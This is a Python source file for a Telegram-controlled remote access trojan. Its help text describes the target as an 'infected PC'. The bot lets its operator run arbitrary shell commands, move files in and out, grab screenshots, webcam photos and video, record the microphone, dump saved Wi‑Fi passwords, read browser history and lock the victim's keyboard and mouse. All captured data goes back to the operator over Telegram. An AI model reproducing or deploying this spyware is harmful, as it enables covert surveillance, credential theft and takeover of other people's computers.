import datetime
import os
from time import sleep

import pyautogui
import pyscreenshot
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.types import ContentType, KeyboardButton, ReplyKeyboardMarkup
from aiogram.utils import executor

from config.config import TOKEN
from remoters.executor import Executor

from remoters.pc_remouter import RemoteManager
from remoters.browser_remoter import BrowserRemote
from remoters.pc_controller.sound import Sound

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

rm = RemoteManager(bot)
br = BrowserRemote()
ex = Executor()


@dp.message_handler(commands=['start', 'help'])
async def command_start(message=types.Message):
    button_help = KeyboardButton("/help")
    button_screenshot = KeyboardButton('Скриншот')
    button_webcam = KeyboardButton('Фото с веб-камеры')
    button_music = KeyboardButton('Музыка')
    button_wifi = KeyboardButton('Wi-fi')
    button_meme = KeyboardButton("Мем")
    button_lmb = KeyboardButton("ЛКМ")
    button_block = KeyboardButton("Блок ввода")
    button_unblock = KeyboardButton("Анблок ввода")

    commands_kb = ReplyKeyboardMarkup(resize_keyboard=True).add(
        button_screenshot, button_webcam, button_music, button_wifi, button_meme,
        button_lmb, button_block, button_unblock, button_help)

    await bot.send_message(message.from_user.id,
                           '/download "имя файла" - скачать файл из директории, в которовый вы находитесь.\n'
                           '/openurl "ссылка" - открыть ссылку\n'
                           '/v "число от 0 до 100" - устанвоить громкость ПК\n'
                           '/s "текст" - озвучить текст\n'
                           '/. "команда" - выполнить консольную команду, которую вы вписали\n'
                           '/change + загрузить фото - загруженное фото станет обоими рабочего столка зараженного ПК\n'
                           '/audmic "время в секундах" - запись звука с микрофона на протяжении указанного времени\n'
                           '/webvid "время в секундах" - запись видео с веб-камеры на протяжении указанного времени\n'
                           '/deskvid "время в секундах" - запись видео с рабочего стола на протяжении указанного времени\n'
                           '\n'
                           '~ Скриншот - получить скриншот.\n'
                           '~ Фото с веб-камеры - получить изображение вебкамеры.\n'
                           '~ Музыка - включить музыку\n'
                           '~ Wi-fi - Получить названия сетей и пароли от них\n'
                           '~ Мем - открыть мем с:\n'
                           '~ ЛКМ - нажатие левой клавишой мыши\n'
                           '~ Блок ввода - запрещает юзеру ПК пользоваться устройствами ввода\n'
                           '~ Анблок ввода - отменяет команду "Блок ввода"\n'
                           '~ Выключить экран - Выключить экран\n'
                           '~ Включить экран - Включить экран (странно работает(не работает))',
                           reply_markup=commands_kb)


async def send_message(bot, id, text):
    while text:
        await bot.send_message(id, text[:4096])
        text = text[4096::]


@dp.message_handler(commands=['download'])
async def download(message: types.Message):
    try:
        command = message.text.split()
        content = open(command[1], 'rb')

        await message.reply_document(content)
    except Exception:
        await message.reply("Error in download file")


@dp.message_handler(commands=['.'])
async def exe(message: types.Message):
    command = message.text.split()[1::]
    await message.reply(ex.execute_command_console(command))


@dp.message_handler(text=['Скриншот'])
async def send_screenshot(msg: types.Message):
    image = pyscreenshot.grab()
    image.save("screen.png")

    await bot.send_photo(msg.from_user.id, types.InputFile('screen.png'))

    os.remove("screen.png")


@dp.message_handler(text=['Фото с веб-камеры'])
async def send_cam(msg: types.Message):
    rm.make_cam_photo()

    await bot.send_photo(msg.from_user.id, types.InputFile('screen_camera.png'))

    os.remove("screen_camera.png")


@dp.message_handler(commands=['webvid'])
async def video_from_webcam(msg: types.Message):
    duration = int(msg.text.split()[1])
    video_bytes = rm.make_cam_video(duration)
    if video_bytes == "Ошибка! Веб-камера выключена, либо она отсутствует.":
        await bot.send_message(msg.from_user.id, video_bytes)

    await bot.send_video(msg.from_user.id, video=video_bytes)
    await bot.send_message(msg.from_user.id, 'Приятного просмотра!')

    os.remove("webvideo.avi")


@dp.message_handler(commands=['deskvid'])
async def video_from_desktop(msg: types.Message):
    duration = int(msg.text.split()[1])
    video_bytes = rm.make_desktop_video(duration)
    await bot.send_video(msg.from_user.id, video=video_bytes)
    await bot.send_message(msg.from_user.id, 'Приятного просмотра!')

    os.remove("deskvideo.avi")


@dp.message_handler(text=['Мем'])
async def open_mem(msg: types.Message):
    br.open_url()
    sleep(3)
    Sound.volume_max()


@dp.message_handler(commands=['openurl'])
async def open_mem(msg: types.Message):
    br.open_url(msg.text.split()[1])


@dp.message_handler(commands='s')
async def say_text(msg: types.Message):
    await rm.say_text(msg.text[2:])


@dp.message_handler(text='ЛКМ')
async def mouse_left_click(msg: types.Message):
    pyautogui.click()


@dp.message_handler(text='Блок ввода')
async def block_input(msg: types.Message):
    await msg.answer(rm.blockinput())


@dp.message_handler(text='Анблок ввода')
async def unblock_input(msg: types.Message):
    await msg.answer(rm.blockinput_stop())


@dp.message_handler(commands=['history'])
async def get_history(msg: types.Message):
    commands = msg.text.split()
    date = commands[1] if len(commands) > 1 else str(datetime.date.today())
    await send_message(bot, msg.from_user.id, br.get_history(date))


@dp.message_handler(commands='v')
async def set_volume(msg: types.Message):
    try:
        Sound.volume_set(int(msg.text.split()[1]))
    except Exception:
        await msg.answer('Введите комманду в формате "/v x", где x - число от 0 до 100')


@dp.message_handler(commands=['get'])
async def voice_say(msg: types.Message):
    rm.get_info()


@dp.message_handler(commands=["change"], commands_prefix="/", commands_ignore_caption=False, content_types=["photo"])
async def change_desktop_wallpapers(msg: types.Message):
    await msg.photo[-1].download('C:/img/img.jpg')
    ex.change_background(r'C:/img/img.jpg')


@dp.message_handler(text=["Wi-fi"])
async def get_passwords(msg: types.Message):
    await send_message(bot, msg.from_user.id, ex.get_passwords())


@dp.message_handler(commands=['audmic'])
async def audio_from_micro(message: types.Message):
    duration = int(message.text.split()[1])
    print("запись")
    audio_bytes = rm.make_audiofile_from_micro(duration)
    await bot.send_audio(message.from_user.id, audio=audio_bytes)
    await bot.send_message(message.from_user.id, 'Вы знаете, что это не совсем законно?')

    os.remove("file.wav")


@dp.message_handler()
async def echo_message(msg: types.Message):
    print(msg.text)
    command = str(msg.text).split()
    result = ex.execute(command)

    await send_message(bot, msg.from_user.id, result)


@dp.message_handler(content_types=[ContentType.DOCUMENT, ContentType.UNKNOWN])
async def upload(msg: types.Message):
    try:
        file = msg.document

        path = ex.execute_command_console('cd')
        path = path[:len(path) - 1:]

        path += '\\' + file.file_name

        await file.download(destination_file=path)
        await msg.reply("Success")
    except Exception:
        await msg.reply("Error in upload file")


if __name__ == '__main__':
    try:
        while True:
            executor.start_polling(dp)
    except:
        print('ошибка')
